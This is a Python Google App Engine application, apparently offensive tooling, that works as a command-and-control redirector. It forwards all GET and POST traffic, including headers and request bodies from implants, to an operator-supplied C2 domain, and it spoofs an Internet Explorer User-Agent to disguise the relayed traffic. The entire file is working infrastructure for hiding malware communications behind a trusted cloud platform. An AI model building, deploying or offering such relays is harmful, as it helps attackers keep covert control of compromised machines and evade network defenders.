import logging
import urllib

import webapp2
import urllib2

# v1.0.1 - updated to support POST request

# change to your IP
redirector = "(insert you C2 domain here)"

class CommandControl(webapp2.RequestHandler):
    def get(self, data):
        url = 'https://'+redirector+'/'+str(data)
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
            for key, value in self.request.headers.iteritems():
                req.add_header(str(key), str(value))

            resp = urllib2.urlopen(req)
            content = resp.read()

            self.response.write(content)
        except urllib2.URLError:
            "Caught Exception, did nothing"
    
	# handle a POST request
    def post(self, data):
        url = 'https://'+redirector+'/'+str(data)
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
            for key, value in self.request.headers.iteritems():
                req.add_header(str(key), str(value))

            # this passes on the data from CB
            req.data = self.request.body

            resp = urllib2.urlopen(req)
            content = resp.read()

            self.response.write(content)
        except urllib2.URLError:
            "Caught Exception, did nothing"

app = webapp2.WSGIApplication([
    (r"/(.+)", CommandControl)
], debug=True)

